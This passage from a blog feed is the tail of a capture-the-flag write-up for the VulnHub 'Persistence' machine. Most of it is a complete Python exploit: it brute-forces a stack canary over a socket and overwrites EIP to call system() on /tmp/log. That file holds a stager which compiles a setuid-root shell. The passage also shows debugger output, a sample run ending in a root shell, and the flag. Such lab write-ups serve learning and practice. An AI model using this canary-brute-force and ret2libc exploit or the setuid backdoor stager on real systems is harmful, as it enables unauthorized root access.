</span><span class='line'>0016<span class="p">|</span> 0xbffff40c --&gt; 0xb7fe08d8 --&gt; 0xb7e74000 --&gt; 0x464c457f
</span><span class='line'>0020<span class="p">|</span> 0xbffff410 --&gt; 0xb7ff6821 <span class="o">(</span>mov    eax,DWORD PTR <span class="o">[</span>ebp-0x10<span class="o">])</span>
</span><span class='line'>0024<span class="p">|</span> 0xbffff414 --&gt; 0xffffffff
</span><span class='line'>0028<span class="p">|</span> 0xbffff418 --&gt; 0xb7ffeff4 --&gt; 0x1cf2c
</span><span class='line'><span class="o">[</span>------------------------------------------------------------------------------<span class="o">]</span>
</span><span class='line'>Legend: code, data, rodata, value
</span><span class='line'>Breakpoint 1, 0x080487de in main <span class="o">()</span>
</span><span class='line'>
</span><span class='line'>gdb-peda<span class="nv">$ </span>searchmem /tmp/log
</span><span class='line'>Searching <span class="k">for</span> <span class="s1">&#39;/tmp/log&#39;</span> in: None ranges
</span><span class='line'>Found 2 results, display max 2 items:
</span><span class='line'>wopr : 0x8048c60 <span class="o">(</span><span class="s2">&quot;/tmp/log&quot;</span><span class="o">)</span>
</span><span class='line'>wopr : 0x8049c60 <span class="o">(</span><span class="s2">&quot;/tmp/log&quot;</span><span class="o">)</span>
</span></code></pre></td></tr></table></div></figure>


<p><code>/tmp/log</code> can be found in 2 places. Lets choose <code>0x8048c60</code>! Now we finally have everything we need to build the payload to send.</p>

<h2>wopr &ndash; the exploit</h2>

<p>To sum up what we have to do to exploit this, we can say that we have to:</p>

<ul>
<li>Provide a string of size 30</li>
<li>Provide the canary we have brute forced</li>
<li>Pad with 4 bytes</li>
<li>Write EIP to the location of <code>system()</code></li>
<li>Provide 4 bytes of JUNK (or the location of <code>exit()</code> as a return)</li>
<li>Provide the location of <code>/tmp/log</code></li>
</ul>


<p>In my exploit, as a result of the above, I would therefore send a payload similar to this:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot; + &quot;\xff\xff\xff\xff&quot; + &quot;AAAA&quot; +
</span><span class='line'>&quot;\x10\xc2\x16\x00&quot; + &quot;JUNK&quot; + &quot;\x60\x8c\x04\x08&quot;
</span></code></pre></td></tr></table></div></figure>


<p>I finished up coding the exploit, which eventually resulted in the following:</p>

<figure class='code'><figcaption><span>Persistence Sploit</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
<span class='line-number'>98</span>
<span class='line-number'>99</span>
<span class='line-number'>100</span>
<span class='line-number'>101</span>
<span class='line-number'>102</span>
<span class='line-number'>103</span>
<span class='line-number'>104</span>
<span class='line-number'>105</span>
<span class='line-number'>106</span>
<span class='line-number'>107</span>
<span class='line-number'>108</span>
<span class='line-number'>109</span>
<span class='line-number'>110</span>
<span class='line-number'>111</span>
<span class='line-number'>112</span>
<span class='line-number'>113</span>
<span class='line-number'>114</span>
<span class='line-number'>115</span>
<span class='line-number'>116</span>
<span class='line-number'>117</span>
<span class='line-number'>118</span>
<span class='line-number'>119</span>
<span class='line-number'>120</span>
<span class='line-number'>121</span>
<span class='line-number'>122</span>
<span class='line-number'>123</span>
<span class='line-number'>124</span>
<span class='line-number'>125</span>
<span class='line-number'>126</span>
<span class='line-number'>127</span>
<span class='line-number'>128</span>
<span class='line-number'>129</span>
<span class='line-number'>130</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="kn">import</span> <span class="nn">socket</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">sys</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">os</span>
</span><span class='line'>
</span><span class='line'><span class="n">payload</span> <span class="o">=</span> <span class="s">&quot;A&quot;</span> <span class="o">*</span> <span class="mi">30</span>  <span class="c"># amount of bytes to before the canary is hit</span>
</span><span class='line'><span class="n">canary</span> <span class="o">=</span> <span class="s">&quot;&quot;</span>     <span class="c"># canary that should update as its bruted</span>
</span><span class='line'>
</span><span class='line'><span class="k">print</span> <span class="s">&quot;&quot;&quot;</span>
</span><span class='line'><span class="s">            A: &quot;So, I heard you like pain...?&quot;</span>
</span><span class='line'><span class="s">            B: &quot;... a bit&quot;</span>
</span><span class='line'><span class="s">            C: &quot;Well, here it is, the: &quot;</span>
</span><span class='line'><span class="s"> ____   ___  ____    _____ ____ _____ ______    ___  ____     __    ___ </span>
</span><span class='line'><span class="s">|    \ /  _]|    \  / ___/|    / ___/|      |  /  _]|    \   /  ]  /  _]</span>
</span><span class='line'><span class="s">|  o  )  [_ |  D  )(   \_  |  (   \_ |      | /  [_ |  _  | /  /  /  [_ </span>
</span><span class='line'><span class="s">|   _/    _]|    /  \__  | |  |\__  ||_|  |_||    _]|  |  |/  /  |    _]</span>
</span><span class='line'><span class="s">|  | |   [_ |    \  /  \ | |  |/  \ |  |  |  |   [_ |  |  /   \_ |   [_ </span>
</span><span class='line'><span class="s">|  | |     ||  .  \ \    | |  |\    |  |  |  |     ||  |  \     ||     |</span>
</span><span class='line'><span class="s">|__| |_____||__|\_|  \___||____|\___|  |__|  |_____||__|__|\____||_____|</span>
</span><span class='line'><span class="s">      _____ ____  _       ___  ____  ______ </span>
</span><span class='line'><span class="s">     / ___/|    \| |     /   \|    ||      |</span>
</span><span class='line'><span class="s">    (   \_ |  o  ) |    |     ||  | |      |</span>
</span><span class='line'><span class="s">     \__  ||   _/| |___ |  O  ||  | |_|  |_|</span>
</span><span class='line'><span class="s">     /  \ ||  |  |     ||     ||  |   |  |  </span>
</span><span class='line'><span class="s">     \    ||  |  |     ||     ||  |   |  |  </span>
</span><span class='line'><span class="s">      \___||__|  |_____| \___/|____|  |__|  </span>
</span><span class='line'><span class="s">                                        </span>
</span><span class='line'><span class="s">                A: &quot;AKA: FU superkojiman &amp;&amp; sagi- !!&quot;</span>
</span><span class='line'><span class="s">                A: &quot;I also have no idea what I am doing&quot;</span>
</span><span class='line'><span class="s">&quot;&quot;&quot;</span>
</span><span class='line'>
</span><span class='line'><span class="k">print</span> <span class="s">&quot;[+] Connecting &amp; starting canary brute force...&quot;</span>
</span><span class='line'>
</span><span class='line'><span class="c"># start the canary brute loop. We want to brute 4 bytes ...</span>
</span><span class='line'><span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">5</span><span class="p">):</span>
</span><span class='line'>
</span><span class='line'>    <span class="c"># ... and try all possibilities</span>
</span><span class='line'>    <span class="k">for</span> <span class="n">canary_byte</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">256</span><span class="p">):</span>
</span><span class='line'>
</span><span class='line'>        <span class="c"># prepare the byte</span>
</span><span class='line'>        <span class="n">hex_byte</span> <span class="o">=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">canary_byte</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>        <span class="c"># prepare the payload</span>
</span><span class='line'>        <span class="n">send</span> <span class="o">=</span> <span class="n">payload</span> <span class="o">+</span> <span class="n">canary</span> <span class="o">+</span> <span class="n">hex_byte</span>
</span><span class='line'>
</span><span class='line'>        <span class="c"># connect and send payload</span>
</span><span class='line'>        <span class="n">sock</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
</span><span class='line'>        <span class="n">sock</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">&#39;127.0.0.1&#39;</span><span class="p">,</span> <span class="mi">3333</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'>        <span class="c"># get the inital banners</span>
</span><span class='line'>        <span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">35</span><span class="p">)</span>   <span class="c"># [+] hello, my name is sploitable\n</span>
</span><span class='line'>        <span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">40</span><span class="p">)</span>   <span class="c"># [+] would you like to play a game?\n </span>
</span><span class='line'>        <span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>    <span class="c"># &gt; </span>
</span><span class='line'>
</span><span class='line'>        <span class="c"># send the payload  </span>
</span><span class='line'>        <span class="n">sock</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">send</span><span class="p">)</span>
</span><span class='line'>        <span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">27</span><span class="p">)</span>   <span class="c"># [+] yeah, I don&#39;t think so\n</span>
</span><span class='line'>
</span><span class='line'>        <span class="c"># if we have a OK response, then we will have this last part</span>
</span><span class='line'>        <span class="c"># as &#39;[+] bye!\n&#39; populated, if its wrong, not</span>
</span><span class='line'>        <span class="n">data</span> <span class="o">=</span>  <span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">64</span><span class="p">)</span>   <span class="c"># [+] bye!\n</span>
</span><span class='line'>        <span class="k">if</span> <span class="s">&quot;bye&quot;</span> <span class="ow">in</span> <span class="n">data</span><span class="p">:</span>
</span><span class='line'>            <span class="k">print</span> <span class="s">&quot;[+] Found a possible canary value of &#39;{0}&#39;!&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">hex_byte</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s">&quot;hex&quot;</span><span class="p">))</span>
</span><span class='line'>            <span class="n">canary</span> <span class="o">+=</span> <span class="n">hex_byte</span>
</span><span class='line'>            <span class="n">sock</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span><span class='line'>            <span class="k">break</span>
</span><span class='line'>
</span><span class='line'>        <span class="n">sock</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span><span class='line'>    <span class="c"># if we cant even find the first byte, we failed already</span>
</span><span class='line'>    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">canary</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="mi">0</span><span class="p">:</span>
</span><span class='line'>        <span class="k">print</span> <span class="s">&quot;[-] Unable to even find the first bit of the canary. No luck&quot;</span>
</span><span class='line'>        <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c"># The canary is our ticket out of here!</span>
</span><span class='line'><span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">canary</span><span class="p">)</span> <span class="o">==</span> <span class="mi">4</span><span class="p">:</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">print</span> <span class="s">&quot;[+] Canary known as : {0}&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">canary</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s">&quot;hex&quot;</span><span class="p">))</span>
</span><span class='line'>    <span class="k">print</span> <span class="s">&quot;[+] Writing /tmp/log to be called by wopr later&quot;</span>
</span><span class='line'>
</span><span class='line'>    <span class="c"># ./wopr has the string /tmp/log in it. We will use this as</span>
</span><span class='line'>    <span class="c"># our code exec point, overwriting whatever is in it atm</span>
</span><span class='line'>    <span class="n">stager</span> <span class="o">=</span> <span class="s">&quot;&quot;&quot;</span>
</span><span class='line'><span class="s">        #!/bin/sh</span>
</span><span class='line'>
</span><span class='line'><span class="s">        # First, prepare a small C shell and move it to /tmp with name getroot</span>
</span><span class='line'><span class="s">        echo &quot;int main(void)</span><span class="se">\n</span><span class="s">{</span><span class="se">\n</span><span class="s">setuid(0);</span><span class="se">\n</span><span class="s">system(</span><span class="se">\\</span><span class="s">&quot;/bin/sh</span><span class="se">\\</span><span class="s">&quot;);</span><span class="se">\n</span><span class="s">return 0;</span><span class="se">\n</span><span class="s">}&quot; &gt; /tmp/getroot.c</span>
</span><span class='line'>
</span><span class='line'><span class="s">        # compile it</span>
</span><span class='line'><span class="s">        /usr/bin/gcc /tmp/getroot.c -o /tmp/getroot</span>
</span><span class='line'>
</span><span class='line'><span class="s">        # change ownership and setuid</span>
</span><span class='line'><span class="s">        /bin/chown root:root /tmp/getroot</span>
</span><span class='line'><span class="s">        /bin/chmod 4777 /tmp/getroot</span>
</span><span class='line'><span class="s">    &quot;&quot;&quot;</span>
</span><span class='line'>
</span><span class='line'>    <span class="c"># write the file</span>
</span><span class='line'>    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">&#39;/tmp/log&#39;</span><span class="p">,</span><span class="s">&#39;w&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">stager_file</span><span class="p">:</span>
</span><span class='line'>        <span class="n">stager_file</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">stager</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>    <span class="c"># make it executable</span>
</span><span class='line'>    <span class="n">os</span><span class="o">.</span><span class="n">chmod</span><span class="p">(</span><span class="s">&#39;/tmp/log&#39;</span><span class="p">,</span> <span class="mo">0755</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>    <span class="c"># now, with the stack canary known and the stager ready, lets corrupt</span>
</span><span class='line'>    <span class="c"># EIP and sploit!</span>
</span><span class='line'>    <span class="n">payload</span> <span class="o">+=</span> <span class="n">canary</span>               <span class="c"># canary we bruted</span>
</span><span class='line'>    <span class="n">payload</span> <span class="o">+=</span> <span class="s">&quot;A&quot;</span> <span class="o">*</span> <span class="mi">4</span>              <span class="c"># padding to EIP wich is at byte 42</span>
</span><span class='line'>    <span class="n">payload</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="se">\x10\x62\xe5\xb7</span><span class="s">&quot;</span>   <span class="c"># system() @ 0xb7e56210, NULL is ok cause memcpy(). Recheck location of system in gdb incase the sploit fails.</span>
</span><span class='line'>    <span class="n">payload</span> <span class="o">+=</span> <span class="s">&quot;JUNK&quot;</span>               <span class="c"># JUNK. Should probably do exit() here. Meh.</span>
</span><span class='line'>    <span class="n">payload</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="se">\x60\x8c\x04\x08</span><span class="s">&quot;</span>   <span class="c"># location if /tmp/log string in .data</span>
</span><span class='line'>
</span><span class='line'>    <span class="c"># and connect &amp;&amp; send</span>
</span><span class='line'>    <span class="k">print</span> <span class="s">&quot;[+] Connecting to service&quot;</span>
</span><span class='line'>    <span class="n">sock</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
</span><span class='line'>    <span class="n">sock</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">&#39;127.0.0.1&#39;</span><span class="p">,</span> <span class="mi">3333</span><span class="p">))</span>
</span><span class='line'>    <span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">35</span><span class="p">)</span>
</span><span class='line'>    <span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">40</span><span class="p">)</span>
</span><span class='line'>    <span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>
</span><span class='line'>    <span class="k">print</span> <span class="s">&quot;[+] Sending Payload&quot;</span>
</span><span class='line'>    <span class="n">sock</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">64</span><span class="p">)</span>
</span><span class='line'>    <span class="n">sock</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span><span class='line'>    <span class="k">print</span> <span class="s">&quot;[+] Done&quot;</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">print</span> <span class="s">&quot;[+] going to try and spawn /tmp/getroot, assuming the sploit worked :)&quot;</span>
</span><span class='line'>    <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s">&quot;/tmp/getroot&quot;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="k">else</span><span class="p">:</span>
</span><span class='line'>    <span class="k">print</span> <span class="s">&quot;[!] Incomplete Canary. Can&#39;t continue reliably&quot;</span>
</span><span class='line'>
</span><span class='line'><span class="c"># done</span>
</span></code></pre></td></tr></table></div></figure>


<p>A sample run would be:</p>

<figure class='code'><figcaption><span>Running sploit.py</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bash-4.1<span class="nv">$ </span>ls -lah /tmp/sploit.py
</span><span class='line'>-rw-rw-r--. 1 avida avida 4.0K Sep 18 10:33 /tmp/sploit.py
</span><span class='line'>bash-4.1<span class="nv">$ </span>python /tmp/sploit.py
</span><span class='line'>
</span><span class='line'>            A: <span class="s2">&quot;So, I heard you like pain...?&quot;</span>
</span><span class='line'>            B: <span class="s2">&quot;... a bit&quot;</span>
</span><span class='line'>            C: <span class="s2">&quot;Well, here it is, the: &quot;</span>
</span><span class='line'> ____   ___  ____    _____ ____ _____ ______    ___  ____     __    ___
</span><span class='line'><span class="p">|</span>    <span class="se">\ </span>/  _<span class="o">]</span><span class="p">|</span>    <span class="se">\ </span> / ___/<span class="p">|</span>    / ___/<span class="p">|</span>      <span class="p">|</span>  /  _<span class="o">]</span><span class="p">|</span>    <span class="se">\ </span>  /  <span class="o">]</span>  /  _<span class="o">]</span>
</span><span class='line'><span class="p">|</span>  o  <span class="o">)</span>  <span class="o">[</span>_ <span class="p">|</span>  D  <span class="o">)(</span>   <span class="se">\_</span>  <span class="p">|</span>  <span class="o">(</span>   <span class="se">\_</span> <span class="p">|</span>      <span class="p">|</span> /  <span class="o">[</span>_ <span class="p">|</span>  _  <span class="p">|</span> /  /  /  <span class="o">[</span>_
</span><span class='line'><span class="p">|</span>   _/    _<span class="o">]</span><span class="p">|</span>    /  <span class="se">\_</span>_  <span class="p">|</span> <span class="p">|</span>  <span class="p">|</span><span class="se">\_</span>_  <span class="o">||</span>_<span class="p">|</span>  <span class="p">|</span>_<span class="o">||</span>    _<span class="o">]</span><span class="p">|</span>  <span class="p">|</span>  <span class="p">|</span>/  /  <span class="p">|</span>    _<span class="o">]</span>
</span><span class='line'><span class="p">|</span>  <span class="p">|</span> <span class="p">|</span>   <span class="o">[</span>_ <span class="p">|</span>    <span class="se">\ </span> /  <span class="se">\ </span><span class="p">|</span> <span class="p">|</span>  <span class="p">|</span>/  <span class="se">\ </span><span class="p">|</span>  <span class="p">|</span>  <span class="p">|</span>  <span class="p">|</span>   <span class="o">[</span>_ <span class="p">|</span>  <span class="p">|</span>  /   <span class="se">\_</span> <span class="p">|</span>   <span class="o">[</span>_
</span><span class='line'><span class="p">|</span>  <span class="p">|</span> <span class="p">|</span>     <span class="o">||</span>  .  <span class="se">\ \ </span>   <span class="p">|</span> <span class="p">|</span>  <span class="p">|</span><span class="se">\ </span>   <span class="p">|</span>  <span class="p">|</span>  <span class="p">|</span>  <span class="p">|</span>     <span class="o">||</span>  <span class="p">|</span>  <span class="se">\ </span>    <span class="o">||</span>     <span class="p">|</span>
</span><span class='line'><span class="p">|</span>__<span class="p">|</span> <span class="p">|</span>_____<span class="o">||</span>__<span class="p">|</span><span class="se">\_</span><span class="p">|</span>  <span class="se">\_</span>__<span class="o">||</span>____<span class="p">|</span><span class="se">\_</span>__<span class="p">|</span>  <span class="p">|</span>__<span class="p">|</span>  <span class="p">|</span>_____<span class="o">||</span>__<span class="p">|</span>__<span class="p">|</span><span class="se">\_</span>___<span class="o">||</span>_____<span class="p">|</span>
</span><span class='line'>      _____ ____  _       ___  ____  ______
</span><span class='line'>     / ___/<span class="p">|</span>    <span class="se">\|</span> <span class="p">|</span>     /   <span class="se">\|</span>    <span class="o">||</span>      <span class="p">|</span>
</span><span class='line'>    <span class="o">(</span>   <span class="se">\_</span> <span class="p">|</span>  o  <span class="o">)</span> <span class="p">|</span>    <span class="p">|</span>     <span class="o">||</span>  <span class="p">|</span> <span class="p">|</span>      <span class="p">|</span>
</span><span class='line'>     <span class="se">\_</span>_  <span class="o">||</span>   _/<span class="p">|</span> <span class="p">|</span>___ <span class="p">|</span>  O  <span class="o">||</span>  <span class="p">|</span> <span class="p">|</span>_<span class="p">|</span>  <span class="p">|</span>_<span class="p">|</span>
</span><span class='line'>     /  <span class="se">\ </span><span class="o">||</span>  <span class="p">|</span>  <span class="p">|</span>     <span class="o">||</span>     <span class="o">||</span>  <span class="p">|</span>   <span class="p">|</span>  <span class="p">|</span>
</span><span class='line'>     <span class="se">\ </span>   <span class="o">||</span>  <span class="p">|</span>  <span class="p">|</span>     <span class="o">||</span>     <span class="o">||</span>  <span class="p">|</span>   <span class="p">|</span>  <span class="p">|</span>
</span><span class='line'>      <span class="se">\_</span>__<span class="o">||</span>__<span class="p">|</span>  <span class="p">|</span>_____<span class="p">|</span> <span class="se">\_</span>__/<span class="p">|</span>____<span class="p">|</span>  <span class="p">|</span>__<span class="p">|</span>
</span><span class='line'>
</span><span class='line'>                A: <span class="s2">&quot;AKA: FU superkojiman &amp;&amp; sagi- !!&quot;</span>
</span><span class='line'>                A: <span class="s2">&quot;I also have no idea what I am doing&quot;</span>
</span><span class='line'>
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Connecting <span class="p">&amp;</span> starting canary bruteforce...
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Found a possible canary value of <span class="s1">&#39;64&#39;</span>!
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Found a possible canary value of <span class="s1">&#39;d3&#39;</span>!
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Found a possible canary value of <span class="s1">&#39;c6&#39;</span>!
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Found a possible canary value of <span class="s1">&#39;15&#39;</span>!
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Canary known as : 64d3c615
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Writing /tmp/log to be called by wopr later
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Connecting to service
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Sending Payload
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Done
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> going to try and spawn /tmp/getroot, assuming the sploit worked :<span class="o">)</span>
</span><span class='line'>sh-4.1# id
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>500<span class="o">(</span>avida<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>,500<span class="o">(</span>avida<span class="o">)</span> <span class="nv">context</span><span class="o">=</span>unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
</span></code></pre></td></tr></table></div></figure>


<p>And, as proof, we cat the flag!</p>

<figure class='code'><figcaption><span>Persistence w00t</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>sh-4.1# cat /root/flag.txt
</span><span class='line'>              .d8888b.  .d8888b. 888
</span><span class='line'>             d88P  Y88bd88P  Y88b888
</span><span class='line'>             888    888888    888888
</span><span class='line'>888  888  888888    888888    888888888
</span><span class='line'>888  888  888888    888888    888888
</span><span class='line'>888  888  888888    888888    888888
</span><span class='line'>Y88b 888 d88PY88b  d88PY88b  d88PY88b.
</span><span class='line'> <span class="s2">&quot;Y8888888P&quot;</span>  <span class="s2">&quot;Y8888P&quot;</span>  <span class="s2">&quot;Y8888P&quot;</span>  <span class="err">&quot;</span>Y888
</span><span class='line'>
</span><span class='line'>Congratulations!!! You have the flag!
</span><span class='line'>
</span><span class='line'>We had a great <span class="nb">time </span>coming up with the
</span><span class='line'>challenges <span class="k">for </span>this boot2root, and we
</span><span class='line'>hope that you enjoyed overcoming them.
</span><span class='line'>
</span><span class='line'>Special thanks goes out to @VulnHub <span class="k">for </span>
</span><span class='line'>hosting Persistence <span class="k">for </span>us, and to
</span><span class='line'>@recrudesce <span class="k">for </span>testing and providing
</span><span class='line'>valuable feedback!
</span><span class='line'>
</span><span class='line'>Until next <span class="nb">time</span>,
</span><span class='line'>      sagi- <span class="p">&amp;</span> superkojiman
</span></code></pre></td></tr></table></div></figure>


<h2>conclusion</h2>

<p>Persistence kicked ass!! I learned a ton and that is the ultimate win. Thanks sagi- &amp;&amp; superkojiman for an incredible challenge! Thanks Vulnhub for the hosting and community!</p>

<h2>thats not all</h2>

<p>There are however a few more things I&rsquo;d like to try.</p>

<ul>
<li>Find if and how we can root Persistence using <code>sysadmin-tool</code></li>
<li>Modify the exploit to a working ROP payload</li>
<li>Explore other avenues to break out of rbash</li>
</ul>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Kali Linux Oracle Support]]></title>
    <link href="http://leonjza.github.io/blog/2014/08/17/kali-linux-oracle-support/"/>
